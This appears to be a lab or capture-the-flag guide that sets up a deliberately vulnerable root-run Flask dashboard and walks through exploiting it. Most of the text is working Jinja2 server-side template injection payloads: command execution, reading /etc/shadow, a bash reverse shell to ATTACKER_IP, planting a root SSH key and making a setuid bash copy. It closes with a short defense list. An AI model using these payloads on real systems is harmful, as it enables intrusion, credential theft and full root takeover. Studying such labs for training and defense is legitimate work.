# Internal Dashboard - Privilege Escalation Setup

## Installation Steps

### 1. Install Dependencies
```bash
# Install Flask and psutil
pip3 install -r /home/developer/internal_app/requirements.txt
```

### 2. Set File Permissions
```bash
# Make developer the owner but ensure they cannot edit the app
chown -R root:developer /home/developer/internal_app
chmod 755 /home/developer/internal_app
chmod 644 /home/developer/internal_app/app.py
chmod 644 /home/developer/internal_app/requirements.txt
```

### 3. Install Systemd Service
```bash
# Copy service file to systemd
cp /home/developer/internal_app/internal-dashboard.service /etc/systemd/system/

# Reload systemd
systemctl daemon-reload

# Enable and start the service
systemctl enable internal-dashboard.service
systemctl start internal-dashboard.service

# Check status
systemctl status internal-dashboard.service
```

### 4. Verify Service
```bash
# Check if it's listening on localhost:5000
ss -tlnp | grep 5000

# Or using netstat
netstat -tlnp | grep 5000
```

## Access from Developer User

### SSH Port Forwarding
```bash
# From attacker machine (after getting developer SSH access)
ssh -L 5000:127.0.0.1:5000 developer@target-ip

# Then access in browser:
http://localhost:5000
```

### Using Curl (from inside the box)
```bash
curl http://127.0.0.1:5000
```

## Exploitation

### SSTI Detection Payload
Test if SSTI is present:
```
{{7*7}}
```
Expected output: `49`

### SSTI Information Gathering
```
{{config}}
{{config.items()}}
{{self}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### SSTI Remote Code Execution (RCE) Payloads

#### Payload 1: Execute 'id' command
```python
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

#### Payload 2: Read /etc/shadow
```python
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/shadow',shell=True,stdout=-1).communicate()[0].strip()}}
```

#### Payload 3: Reverse Shell
```python
{{''.__class__.__mro__[1].__subclasses__()[396]('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',shell=True,stdout=-1).communicate()}}
```

#### Payload 4: Alternative RCE (using os module)
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/exploit.sh')}}
```

#### Payload 5: Write SSH Key
```python
{{''.__class__.__mro__[1].__subclasses__()[396]('mkdir -p /root/.ssh && echo "YOUR_PUBLIC_KEY" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys',shell=True,stdout=-1).communicate()}}
```

### Simplest Exploitation Flow

1. **Port Forward**: `ssh -L 5000:127.0.0.1:5000 developer@target`
2. **Access Dashboard**: Open `http://localhost:5000`
3. **Test SSTI**: Enter `{{7*7}}` in the service name field
4. **Get Root Shell**: Use RCE payload to add SSH key or reverse shell
5. **Login as Root**: `ssh root@target` or catch reverse shell

## Why This Works

1. **Flask app runs as root** via systemd service
2. **SSTI vulnerability** in the service name input field
3. **No input sanitization** - user input rendered directly in template
4. **Jinja2 allows code execution** through Python object introspection
5. **Attacker gets root shell** because app runs with root privileges

## Clean Exploitation Example

```bash
# Step 1: As developer, verify service is running
ps aux | grep app.py

# Step 2: Port forward from attacker machine
ssh -L 5000:127.0.0.1:5000 developer@192.168.1.100

# Step 3: In browser, navigate to http://localhost:5000

# Step 4: In "Service Name" field, enter:
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# Step 5: If it shows "root", you have RCE as root!

# Step 6: Get root shell:
{{''.__class__.__mro__[1].__subclasses__()[396]('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash',shell=True,stdout=-1).communicate()}}

# Step 7: Execute on the box as developer:
/tmp/rootbash -p
# You are now root!
```

## Defense

To prevent this vulnerability:
1. Never use `render_template_string()` with user input
2. Use `render_template()` with proper template files
3. Sanitize all user inputs
4. Run services with least privilege (not as root)
5. Use template sandboxing
